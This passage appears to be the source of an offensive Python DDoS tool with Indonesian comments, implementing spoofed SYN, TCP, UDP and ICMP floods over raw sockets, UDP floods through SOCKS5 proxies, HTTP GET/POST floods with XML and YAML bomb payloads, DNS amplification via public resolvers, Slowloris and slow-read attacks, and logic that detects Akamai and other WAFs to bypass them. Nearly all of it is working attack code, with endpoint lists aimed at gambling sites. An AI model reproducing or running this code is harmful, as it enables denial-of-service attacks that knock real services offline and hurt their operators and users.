                    print(f"{Fore.YELLOW}[!] Akamai Terdeteksi! Meningkatkan Randomisasi L7.")
                    weights.update({"cffi": 15, "l7": 5, "bypass": 5, "quantum": 10})
                elif r.status_code == 403:
                    print(f"{Fore.YELLOW}[!] WAF Generik Terdeteksi (HTTP 403). Mengaktifkan CFFI Bypass.")
                    weights.update({"cffi": 20, "l7": 2, "l4": 0.5, "quantum": 7})
            else:
                print(f"{Fore.GREEN}[+] Port Non-Web. Kekuatan Penuh L4.")
                weights.update({"l4": 5, "l7": 0, "bypass": 0, "amp": 3})
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[!] Target tampaknya mati atau memblokir probe. Melepaskan Banjir L4.")
            weights.update({"cffi": 5, "l4": 10, "l7": 1, "bypass": 0, "amp": 5})
        return weights
    
    def get_os_tcp_options(self):
        """Generate TCP Options realistis meniru fingerprint OS asli (Anti-Mitigasi L4)"""
        os_type = random.choice(["windows", "linux", "ios"])
        nop = b'\x01'
        mss = struct.pack('!BBH', 2, 4, 1460)
        
        if os_type == "windows":
            # Windows: MSS, NOP, WScale, SACK, TS
            wscale = struct.pack('!BBB', 3, 3, 8)
            sack = struct.pack('!BB', 4, 2)
            ts = struct.pack('!BBII', 8, 10, int(time.time()), 0)
            return mss + nop + wscale + sack + ts, 64240
            
        elif os_type == "linux":
            # Linux: MSS, SACK, TS, NOP, WScale
            sack = struct.pack('!BB', 4, 2)
            ts = struct.pack('!BBII', 8, 10, int(time.time()), 0)
            wscale = struct.pack('!BBB', 3, 3, 7)
            return mss + sack + ts + nop + wscale, 29200
            
        else: # iOS/Mac
            # iOS: MSS, NOP, WScale, SACK, TS
            wscale = struct.pack('!BBB', 3, 3, 6)
            sack = struct.pack('!BB', 4, 2)
            ts = struct.pack('!BBII', 8, 10, int(time.time()), 0)
            return mss + nop + wscale + sack + ts, 65535

    def get_os_tcp_options_scapy_format(self):
        """Wrapper for Scapy format TCP options (Real OS Fingerprinting)"""
        # Scapy expects list of tuples: [('MSS', 1460), ('NOP', None), ...]
        os_type = random.choice(["windows", "linux", "ios"])
        if os_type == "windows":
            return [('MSS', 1460), ('NOP', None), ('WScale', 8), ('SAckOK', b''), ('Timestamp', (int(time.time()), 0))], 64240
        elif os_type == "linux":
            return [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (int(time.time()), 0)), ('NOP', None), ('WScale', 7)], 29200
        else:
            return [('MSS', 1460), ('NOP', None), ('WScale', 6), ('SAckOK', b''), ('Timestamp', (int(time.time()), 0))], 65535

    def syn_flood(self):
        """Enhanced SYN Flood dengan spoofing"""
        if not SCAPY_AVAILABLE:
            return
        while self.running: # Loop utama
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4")
                
                # Menggunakan opsi TCP realistis dari AI Brain
                tcp_opts, _ = self.get_os_tcp_options_scapy_format() # Perlu wrapper kecil untuk format Scapy
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), 
                                                            dport=target_port, flags="S", options=tcp_opts)
                send(packet, verbose=0)
                self.stats["packets"] += 10
                if self.dynamic_mode: break # Keluar setelah 1 burst agar bisa ganti strategi
            except Exception as e:
                self.global_learning_data["errors"]["syn_flood"] += 1
                # print(f"SYN Flood Error: {e}") # Debug

    def syn_flood_raw(self):
        """TCP SYN Flood - Raw Socket (Faster than Scapy)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576) # Increase send buffer to 1MB
        except Exception as e:
            print(f"{Fore.RED}[!] Raw socket failed: {e}")
            return

        def checksum(msg):
            s = 0
            if len(msg) % 2 == 1: msg += b'\0'
            for i in range(0, len(msg), 2):
                w = (msg[i] << 8) + msg[i+1]
                s = s + w
            s = (s >> 16) + (s & 0xffff)
            s = ~s & 0xffff
            return s

        while self.running:
            packets_sent = 0
            try:
                self.new_dangerous_function()
                dest_ip = self.get_target_ip() # Rotasi IP Target
                src_ip = self.generate_smart_ip()
                # IP Header
                saddr = socket.inet_aton(src_ip)
                daddr = socket.inet_aton(dest_ip)
                ttl = random.randint(64, 128)
                
                # Advanced OS Fingerprint Spoofing
                options, window_size = self.get_os_tcp_options()
                tcp_header_len = 20 + len(options)
                data_offset = (tcp_header_len // 4) << 4
                
                ip_header = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 20 + tcp_header_len, random.randint(10000, 50000), 0, ttl, socket.IPPROTO_TCP, 0, saddr, daddr)
                
                # TCP Header
                source = random.randint(1024, 65535)
                target_port = self.get_target_port("l4")
                seq = random.randint(0, 0xFFFFFFFF) # 32-bit sequence number
                tcp_header_tmp = struct.pack('!HHLLBBHHH', source, target_port, seq, 0, data_offset, 2, socket.htons(window_size), 0, 0)
                
                # Checksum
                psh = struct.pack('!4s4sBBH', saddr, daddr, 0, socket.IPPROTO_TCP, tcp_header_len)
                check = checksum(psh + tcp_header_tmp + options) # Calculate checksum with options
                
                tcp_header = struct.pack('!HHLLBBH', source, target_port, seq, 0, data_offset, 2, socket.htons(window_size)) + struct.pack('H', check) + struct.pack('!H', 0) + options
                
                # Burst send to overcome Python overhead
                packet = ip_header + tcp_header
                for _ in range(20):
                    s.sendto(packet, (dest_ip, 0))
                    self.stats["packets"] += 1
                    packets_sent += 1
                if self.dynamic_mode and packets_sent > 100: break # Burst limit
            except Exception as e:
                self.global_learning_data["errors"]["syn_flood_raw"] += 1
                # print(f"SYN Flood Raw Error: {e}") # Debug

    def tcp_manipulation_flood(self):
        """TCP Flood dengan Manipulasi Flag & Window (Bypass Firewall)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576) # Increase send buffer
        except Exception as e:
            print(f"{Fore.RED}[!] Raw socket failed: {e}")
            return

        def checksum(msg):
            s = 0
            if len(msg) % 2 == 1: msg += b'\0'
            for i in range(0, len(msg), 2):
                w = (msg[i] << 8) + msg[i+1]
                s = s + w
            s = (s >> 16) + (s & 0xffff)
            s = ~s & 0xffff
            return s

        while self.running:
            try:
                self.new_dangerous_function()
                dest_ip = self.get_target_ip() # Rotasi IP Target
                payload = self.generate_payload(16, 100)
                src_ip = self.generate_smart_ip()
                saddr = socket.inet_aton(src_ip)
                daddr = socket.inet_aton(dest_ip)
                ip_header = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 40 + len(payload), random.randint(10000, 50000), 0, 255, socket.IPPROTO_TCP, 0, saddr, daddr)
                
                source = random.randint(1024, 65535)
                target_port = self.get_target_port("l4") # Use smart port selection
                seq = random.randint(0, 4294967295)
                ack = random.randint(0, 4294967295)
                
                # Manipulasi: Random Flags (SYN, ACK, PSH, FIN, RST) & Window Size
                flags = random.choice([2, 16, 18, 24, 20, 4, 2]) # 2=SYN, 16=ACK, 18=SYN+ACK, etc
                window = random.choice([65535, 5840, 64240, 8192, 14600])
                
                tcp_header_tmp = struct.pack('!HHLLBBHHH', source, target_port, seq, ack, (5 << 4), flags, socket.htons(window), 0, 0)
                
                psh = struct.pack('!4s4sBBH', saddr, daddr, 0, socket.IPPROTO_TCP, len(tcp_header_tmp) + len(payload))
                check = checksum(psh + tcp_header_tmp + payload)
                
                tcp_header = struct.pack('!HHLLBBH', source, target_port, seq, ack, (5 << 4), flags, socket.htons(window)) + struct.pack('H', check) + struct.pack('!H', 0)
                
                s.sendto(ip_header + tcp_header + payload, (dest_ip, 0))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_manipulation_flood"] += 1
                # print(f"TCP Manipulation Flood Error: {e}") # Debug

    def udp_flood(self):
        """UDP Flood - Spoofed IP with User-Agent Rotation (RAW SOCKET OPTIMIZED)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576) # Increase send buffer
        except Exception as e:
            print(f"{Fore.RED}[!] Raw socket failed: {e}")
            return

        prefixes = [
            b"Source Engine Query\x00",  # Game Server Query
            b"M-SEARCH * HTTP/1.1\r\n",  # SSDP/UPnP
            b"INVITE sip:user@domain SIP/2.0\r\n",  # VoIP (SIP)
            b"\xff\xff\xff\xffgetstatus\x00"  # Quake/CoD Engine
        ]
        
        while self.running:
            packets_sent = 0
            try:
                self.new_dangerous_function()
                dest_ip = self.get_target_ip() # Rotasi IP Target
                daddr = socket.inet_aton(dest_ip)
                src_ip = self.generate_smart_ip()
                saddr = socket.inet_aton(src_ip)
                
                prefix = random.choice(prefixes)
                payload = prefix + b"User-Agent: " + self.get_user_agent().encode() + b"\r\n" + self.generate_payload(64, 1024)
                
                sport = random.randint(1024, 65535)
                target_port = self.get_target_port("l4")
                length = 8 + len(payload)
                udp_header = struct.pack('!HHHH', sport, target_port, length, 0)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 20 + length, random.randint(10000, 50000), 0, 64, socket.IPPROTO_UDP, 0, saddr, daddr)
                
                # Burst send
                packet = ip_header + udp_header + payload
                for _ in range(random.randint(20, 60)):
                    s.sendto(packet, (dest_ip, 0))
                    self.stats["packets"] += 1
                    packets_sent += 1
                if self.dynamic_mode and packets_sent > 100: break
            except Exception as e:
                self.global_learning_data["errors"]["udp_flood"] += 1
                # print(f"UDP Flood Error: {e}") # Debug

    def udp_flood_socks5(self):
        """UDP Flood via SOCKS5 Proxy"""
        prefixes = [
            b"Source Engine Query\x00",
            b"M-SEARCH * HTTP/1.1\r\n",
            b"INVITE sip:user@domain SIP/2.0\r\n",
            b"\xff\xff\xff\xffgetstatus\x00"
        ]

        while self.running:
            proxy = random.choice(self.proxies) if self.proxies else None
            if not proxy:
                time.sleep(0.1)
                continue
                
            try:
                proxy_ip, proxy_port, user, password = self.parse_proxy(proxy)
                # 1. Connect to SOCKS5 Proxy (TCP)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((proxy_ip, int(proxy_port)))
                
                # 2. Auth Handshake
                if user and password:
                    s.send(b'\x05\x02\x00\x02') # Support No Auth (00) and User/Pass (02)
                    method = s.recv(2)
                    if method[1] == 2: # Server wants User/Pass
                        auth_payload = b'\x01' + bytes([len(user)]) + user.encode() + bytes([len(password)]) + password.encode()
                        s.send(auth_payload)
                        if s.recv(2) != b'\x01\x00': # Auth failed
                            s.close(); continue
                    elif method[1] == 255: # No acceptable methods
                        s.close(); continue
                else:
                    s.send(b'\x05\x01\x00')
                    if s.recv(2) != b'\x05\x00': 
                        s.close(); continue
                
                # 3. UDP Associate Request
                s.send(b'\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00')
                resp = s.recv(10)
                if not resp or resp[1] != 0x00:
                    s.close()
                    continue
                
                # Parse Relay Address
                relay_ip = socket.inet_ntoa(resp[4:8])
                relay_port = struct.unpack('>H', resp[8:10])[0]
                
                # 4. Send UDP Packets to Relay
                udp_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(random.randint(30, 70)): # Randomize burst
                    if not self.running: break
                    self.new_dangerous_function()
                    
                    # Dynamic Target per packet for better distribution
                    tgt_ip = self.get_target_ip()
                    tgt_port = self.get_target_port("l4")
                    target_header = b'\x00\x00\x00\x01' + socket.inet_aton(tgt_ip) + struct.pack('>H', tgt_port)
                    
                    # Dynamic payload generation
                    prefix = random.choice(prefixes)
                    payload = prefix + b"User-Agent: " + self.get_user_agent().encode() + b"\r\n" + self.generate_payload(64, 1024)
                    
                    udp_s.sendto(target_header + payload, (relay_ip, relay_port))
                    self.stats["packets"] += 1
                
                udp_s.close()
                s.close()
                if self.dynamic_mode: break
            except Exception as e: # Catch specific exceptions for better debugging
                # print(f"UDP SOCKS5 Flood Error: {e}") # Debug
                self.global_learning_data["errors"]["udp_flood_socks5"] += 1
                try: s.close()
                except: pass

    def get_smart_payload(self):
        """Menghasilkan payload realistis untuk membingungkan WAF"""
        payload_types = [
            {"username": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8)), "password": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12))},
            {"query": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(3, 10))), "filter": "price_desc"},
            {"data": os.urandom(32).hex(), "session_id": os.urandom(16).hex()},
            # Payload yang sedikit "berbahaya" untuk menguji WAF
            {"q": "' OR 1=1 --"}, 
            {"search": "<script>alert(1)</script>"},
            {"id": "1;-SLEEP(5)"},
            {"user": "admin'#"},
            {"file": "../../../etc/passwd"}
        ]
        return random.choice(payload_types)

    def get_smart_path(self):
        """Generate realistic paths to stress backend logic (Cache Bypass)"""
        endpoints = [
            "/", "/search", "/login", "/register", "/api/v1/status", 
            "/cart", "/checkout", "/product/1", "/courses", "/dashboard",
            # Target-specific heavy endpoints
            "/slots", "/casino", "/bet", "/api/balance", "/user/profile",
        ]
        base = random.choice(endpoints)
        # Add random query params to bypass cache
        q = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(3, 8)))
        t = str(time.time())
        r = os.urandom(2).hex()
        return f"{base}?q={q}&t={t}&r={r}"

    def _get_session(self):
        return requests.Session()

    def http_get_flood(self):
        """HTTP GET Flood dengan random UA & proxy"""
        with requests.Session() as s:
            req_count = 0
            while self.running:
                try:
                    self.new_dangerous_function()
                    # Smart Port Selection for L7: If random port (0) chosen, default to 80 or 443
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                    proxy = self.get_proxy()
                    headers = {
                        'User-Agent': self.get_user_agent(),
                        'X-Forwarded-For': self.generate_smart_ip(),  # Spoof IP
                        'Client-IP': self.generate_smart_ip(),        # Spoof IP
                        'Accept': random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8']),
                        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'es-ES,es;q=0.5']),
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache, no-store, must-revalidate', # Aggressive cache busting
                        'Pragma': 'no-cache',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://facebook.com', 'https://twitter.com']),
                        f'X-Random-{random.randint(1,1000)}': os.urandom(4).hex() # Random header to change packet signature
                    }
                    
                    start_t = time.time()
                    r = s.get(url, headers=headers, proxies=proxy, timeout=2, stream=True)
                    lat = time.time() - start_t
                    self.stats["requests"] += 10
                    req_count += 10
                    if self.dynamic_mode and req_count > 50: break # Ganti strategi setelah 50 request
                    
                    # Feed data back to AI (Non-blocking analysis)
                    if random.random() < 0.1: # Sample 10% requests to save CPU
                        self.ai.analyze_response(url, r.status_code, dict(r.headers), 0, lat)
                except requests.exceptions.RequestException:
                    if proxy:
                        self.report_dead_proxy(proxy['http'].replace("http://", ""))
                    self.global_learning_data["errors"]["http_get_flood"] += 1

    def fast_http_flood(self):
        """Socket-based HTTP Flood (High RPS) - Pipelining"""
        while self.running:
            s = None
            try:
                # Setup socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
                # Target selection
                target_ip = self.get_target_ip()
                port = self.get_target_port("l7")
                
                # Proxy handling
                proxy = self.get_proxy()
                if proxy:
                    try:
                        proxy_ip, proxy_port, user, password = self.parse_proxy(proxy['http'])
                        s.connect((proxy_ip, int(proxy_port)))
                        
                        auth_header = ""
                        if user and password:
                            cred = base64.b64encode(f"{user}:{password}".encode()).decode()
                            auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
                        s.send(f"CONNECT {self.target}:{port} HTTP/1.1\r\nHost: {self.target}:{port}\r\n{auth_header}\r\n".encode())
                    except:
                        s.close()
                        continue
                else:
                    s.connect((target_ip, port))
                
                # SSL Wrap
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.target)
                
                # Pipelining Requests
                path = self.get_smart_path()
                ua = self.get_user_agent()
                # Minimal headers for speed
                payload = (f"GET {path} HTTP/1.1\r\n"
                           f"Host: {self.target}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"Connection: keep-alive\r\n"
                           f"Accept: */*\r\n\r\n").encode()
                
                # Send multiple times (Pipelining/Keep-Alive)
                for _ in range(100):
                    if not self.running: break
                    s.send(payload)
                    self.stats["requests"] += 1
                
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["fast_http_flood"] += 1
                if s:
                    try: s.close()
                    except: pass

    def api_json_flood(self):
        """API JSON Flood - Mengirim payload JSON berat"""
        # Re-use logic from http_post_flood but specialized
        self.http_post_flood()

    def http_post_flood(self):
        """HTTP POST Flood - Heavy payload with Header Manipulation"""
        with self._get_session() as s:
            req_count = 0
            while self.running:
                try:
                    proxy = self.get_proxy()
                    
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                    
                    headers = self.get_rotated_headers()
                    headers['Referer'] = random.choice(['https://google.com', 'https://bing.com', 'https://facebook.com'])
                    headers['X-Requested-With'] = 'XMLHttpRequest'
                    headers['X-Forwarded-For'] = self.generate_smart_ip()
                    headers['Client-IP'] = self.generate_smart_ip()
                    headers['Via'] = self.generate_smart_ip()

                    start_t = time.time()
                    r = None # Initialize r
                    data_to_send = None
                    json_to_send = None

                    # AI Integration: Use intelligent payload 30% of the time
                    if random.random() < 0.3:
                        pattern = random.choice(list(PIYOAIAnalyzer.AttackPattern))
                        ai_data = self.ai.generate_intelligent_payload(url, pattern)
                        attack_type = 99 # Special AI type
                    else:
                        attack_type = random.randint(1, 7) # Added more types
                    
                    if attack_type == 1:
                        # XML Bomb (Billion Laughs Attack)
                        xml_payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""
                        headers['Content-Type'] = 'application/xml'
                        data_to_send = xml_payload
                    elif attack_type == 2:
                        # JSON Heavy Payload
                        json_to_send = {f"key{random.randint(1,1000)}": "A"*random.randint(1000,50000)}
                        headers['Content-Type'] = 'application/json'
                    elif attack_type == 3:
                        # Form Data (Heavy)
                        data_to_send = urlencode({f"param{random.randint(1,1000)}": "B"*random.randint(1000,50000)})
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    elif attack_type == 5:
                        # GraphQL Batch Attack
                        query = "query { __schema { types { name fields { name } } } }"
                        json_to_send = [ {"query": query} for _ in range(random.randint(10, 50)) ]
                        headers['Content-Type'] = 'application/json'
                    elif attack_type == 6:
                        # YAML Deserialization / Bomb
                        yaml_payload = "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\nf: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]"
                        data_to_send = yaml_payload
                        headers['Content-Type'] = 'application/x-yaml'
                    elif attack_type == 7:
                        # SSTI Payload
                        ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}"]
                        data_to_send = urlencode({f"input{random.randint(1,100)}": random.choice(ssti_payloads)})
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    elif attack_type == 99:
                        # AI Generated Payload
                        headers.update(ai_data.get("headers", {}))
                        if ai_data.get("method", "GET") == "POST":
                            if headers.get('Content-Type') == 'application/json':
                                json_to_send = ai_data.get("params", {})
                            else:
                                data_to_send = urlencode(ai_data.get("params", {}))
                        else: # Fallback to GET if AI suggests GET for POST flood
                            r = s.get(url, params=ai_data.get("params", {}), headers=headers, proxies=proxy, timeout=3)
                            
                    else:
                        # Multipart/form-data (File Upload Simulation)
                        files = {'file': (os.urandom(8).hex() + '.dat', self.generate_payload(1024, 1024*10))} # 1KB to 10KB file
                        # Biarkan requests menangani Content-Type untuk multipart
                        r = s.post(url, files=files, headers=headers, proxies=proxy, timeout=4)
                        
                    self.stats["requests"] += 10
                    req_count += 10
                    if self.dynamic_mode and req_count > 50: break
                    
                    if r is None: # If not handled by AI GET fallback
                        r = s.post(url, json=json_to_send, data=data_to_send, headers=headers, proxies=proxy, timeout=3)

                    lat = time.time() - start_t
                    # Feed data back to AI (Non-blocking analysis)
                    if random.random() < 0.1: # Sample 10% requests to save CPU
                        self.ai.analyze_response(url, r.status_code, dict(r.headers), 0, lat)
                except requests.exceptions.RequestException:
                    if proxy:
                        self.report_dead_proxy(proxy['http'].replace("http://", ""))
                    self.global_learning_data["errors"]["http_post_flood"] += 1

    def dns_amplification(self):
        """DNS Amplification Test"""
        if not SCAPY_AVAILABLE:
            return
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", # Google & Cloudflare
            "9.9.9.9", "149.112.112.112", # Quad9
            "208.67.222.222", "208.67.220.220", # OpenDNS
            "8.26.56.26", "8.20.247.20", # Comodo Secure DNS
            "185.228.168.9", "185.228.169.9", # CleanBrowsing
            "76.76.19.19", "76.223.122.150" # Alternate DNS
        ]

        # Load custom DNS servers if file exists
        if os.path.exists("dns.txt"):
            try:
                with open("dns.txt", "r") as f:
                    custom_dns = [line.strip() for line in f if line.strip()]
                if custom_dns:
                    print(f"{Fore.GREEN}[+] Loaded {len(custom_dns)} custom DNS servers from dns.txt")
                    dns_servers = custom_dns
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to load dns.txt: {e}")

        while self.running:
            try:
                self.new_dangerous_function()
                server = random.choice(dns_servers) # DNS server to query
                spoofed_ip = self.get_target_ip() # Spoofed source IP
                packet = IP(src=spoofed_ip, dst=server)/UDP(sport=53, dport=53)/(
                    b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + 
                    b"www.example.com" + b"\x00\x00\xff\x00\x01")
                send(packet, verbose=0)
                self.stats["packets"] += 1  # Amplification factor
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["dns_amplification"] += 1

    def icmp_flood(self):
        """ICMP Flood - RAW SOCKET OPTIMIZED"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576) # Increase send buffer
        except:
            return

        def checksum(msg):
            s = 0
            if len(msg) % 2 == 1: msg += b'\0'
            for i in range(0, len(msg), 2):
                w = (msg[i] << 8) + msg[i+1]
                s = s + w
            s = (s >> 16) + (s & 0xffff)
            s = ~s & 0xffff
            return s

        while self.running:
            try:
                self.new_dangerous_function()
                dest_ip = self.get_target_ip()
                daddr = socket.inet_aton(dest_ip)
                
                src_ip = self.generate_smart_ip()
                saddr = socket.inet_aton(src_ip)
                payload = self.generate_payload(32, 64)

                # Advanced ICMP: Rotate Types to confuse Firewall/IDS
                # 8: Echo Req, 3: Dest Unreach, 11: Time Exceeded, 13: Timestamp
                icmp_type = random.choice([8, 3, 11, 13])
                code = random.randint(0, 15) if icmp_type == 3 else 0
                
                icmp_header_tmp = struct.pack('!BBHHH', icmp_type, code, 0, random.randint(0, 65535), random.randint(0, 65535))
                chksum = checksum(icmp_header_tmp + payload)
                icmp_header = struct.pack('!BBHHH', icmp_type, code, chksum, random.randint(0, 65535), random.randint(0, 65535))
                
                ip_header = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 20 + len(icmp_header) + len(payload), random.randint(10000, 50000), 0, 64, socket.IPPROTO_ICMP, 0, saddr, daddr)
                
                s.sendto(ip_header + icmp_header + payload, (dest_ip, 0))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["icmp_flood"] += 1
                # print(f"ICMP Flood Error: {e}") # Debug
                # print(f"ICMP Flood Error: {e}") # Debug

    def slowloris_flood(self):
        """Slowloris Attack - Advanced with Random Headers & Proxy Support"""
        while self.running:
            try:
                self.new_dangerous_function()
                proxy = random.choice(self.proxies) if self.proxies else None
                current_port = self.get_target_port("l7") # Smart port selection
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                if proxy:
                    try:
                        proxy_ip, proxy_port, user, password = self.parse_proxy(proxy)
                        s.connect((proxy_ip, int(proxy_port)))
                        # HTTP CONNECT Tunneling untuk menyembunyikan IP asli
                        auth_header = ""
                        if user and password:
                            cred = base64.b64encode(f"{user}:{password}".encode()).decode()
                            auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
                        s.send(f"CONNECT {self.target}:{current_port} HTTP/1.1\r\nHost: {self.target}:{current_port}\r\n{auth_header}\r\n".encode())
                        if b"200" not in s.recv(1024):
                            s.close()
                            continue
                    except:
                        s.close()
                        continue
                else:
                    s.connect((self.get_target_ip(), current_port))
                    
                self.stats["connections"] += 1
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"Host: {self.target}\r\n".encode("utf-8"))
                s.send(f"User-Agent: {self.get_user_agent()}\r\n".encode("utf-8"))
                s.send(b"Accept-language: en-US,en,q=0.5\r\n")
                
                # Rotate User-Agent by reconnecting after random requests
                for _ in range(random.randint(20, 100)):
                    if not self.running: break
                    # Send random headers to keep connection alive
                    header_name = f"X-{random.choice(['Auth', 'API', 'Token', 'Ref', 'Client'])}-{random.randint(1, 1000)}"
                    header_value = random.randint(1, 100000)
                    s.send(f"{header_name}: {header_value}\r\n".encode("utf-8"))
                    
                    # Randomize sleep to avoid detection
                    time.sleep(random.uniform(5, 15))
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["slowloris_flood"] += 1
                # print(f"Slowloris Flood Error: {e}") # Debug
                # print(f"Slowloris Flood Error: {e}") # Debug

    def slow_read_flood(self):
        """Slow Read Attack (Reverse Slowloris) - Membaca response lambat"""
        while self.running:
            s = None
            try:
                self.new_dangerous_function()
                proxy = random.choice(self.proxies) if self.proxies else None
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                if proxy:
                    try:
                        proxy_ip, proxy_port, user, password = self.parse_proxy(proxy)
                        s.connect((proxy_ip, int(proxy_port)))
                        auth_header = ""
                        if user and password:
                            cred = base64.b64encode(f"{user}:{password}".encode()).decode()
                            auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
                        s.send(f"CONNECT {self.target}:{self.port} HTTP/1.1\r\nHost: {self.target}:{self.port}\r\n{auth_header}\r\n".encode())
                        if b"200" not in s.recv(1024):
                            s.close()
                            continue
                    except:
                        s.close()
                        continue
                else:
                    current_port = self.get_target_port("l7") # Use smart port selection
                    s.connect((self.get_target_ip(), current_port))
                
                # SSL Wrap if target is HTTPS
                # Kirim request normal
                path = f"/?{random.randint(0, 1000000)}"
                packet = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {self.get_user_agent()}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n".encode()
                
                s.send(packet.encode())
                self.stats["connections"] += 1
                
                while self.running:
                    # Baca response sangat lambat (1 byte per detik) untuk menahan koneksi server
                    data = s.recv(1)
                    self.new_dangerous_function()
                    if not data: break
                    time.sleep(random.uniform(0.5, 2.0))
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["slow_read_flood"] += 1
